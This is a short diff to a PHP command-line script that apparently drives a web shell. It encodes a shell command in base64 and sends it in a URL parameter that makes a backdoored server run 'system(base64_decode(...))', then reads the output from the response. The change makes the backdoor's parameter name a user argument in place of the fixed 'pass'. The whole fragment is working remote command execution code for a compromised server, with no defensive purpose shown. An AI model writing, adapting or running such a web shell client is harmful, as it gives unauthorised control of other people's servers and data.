@@ -16,9 +16,9 @@ while(1){
         $salt = get_salt(10);
 
         if(!is_bool(stripos($argv[1], '?'))){
-                $url = $argv[1]."&pass=system(base64_decode(\$_GET[365234]));&365234=".urlencode(base64_encode("echo {$salt};{$command};echo {$salt};"));
+                $url = $argv[1]."&{$argv[2]}=system(base64_decode(\$_GET[365234]));&365234=".urlencode(base64_encode("echo {$salt};{$command};echo {$salt};"));
         }else{
-                $url = $argv[1]."?pass=system(base64_decode(\$_GET[365234]));&365234=".urlencode(base64_encode("echo {$salt};{$command};echo {$salt};"));
+                $url = $argv[1]."?{$argv[2]}=system(base64_decode(\$_GET[365234]));&365234=".urlencode(base64_encode("echo {$salt};{$command};echo {$salt};"));
         }
 
         $resp = file_get_contents($url);
